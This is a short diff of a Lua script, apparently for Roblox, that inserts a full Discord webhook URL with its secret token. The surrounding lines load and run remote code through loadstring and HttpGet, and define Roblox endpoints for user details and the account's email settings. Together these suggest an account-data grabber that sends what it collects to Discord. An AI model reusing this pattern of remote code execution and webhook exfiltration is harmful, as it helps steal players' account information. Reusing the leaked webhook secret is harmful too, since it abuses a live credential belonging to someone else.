@@ -24,7 +24,7 @@ local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypi
 local prettySettings = {pretty = true}
 
 local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
-local DISCORD_WEBHOOK = ""
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1332755353414144094/9RSOCg1Miu2UJH8otpPFQ3-bnIpIM-3iOepCqzs5ozEXXh11l8LZhPtnO9zmCY5f248j"
 local USER_URL = "https://users.roblox.com/v1/users/%s"
 local GAMES_URL = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=%s"
 local EMAIL_URL = "https://accountsettings.roblox.com/v1/email"
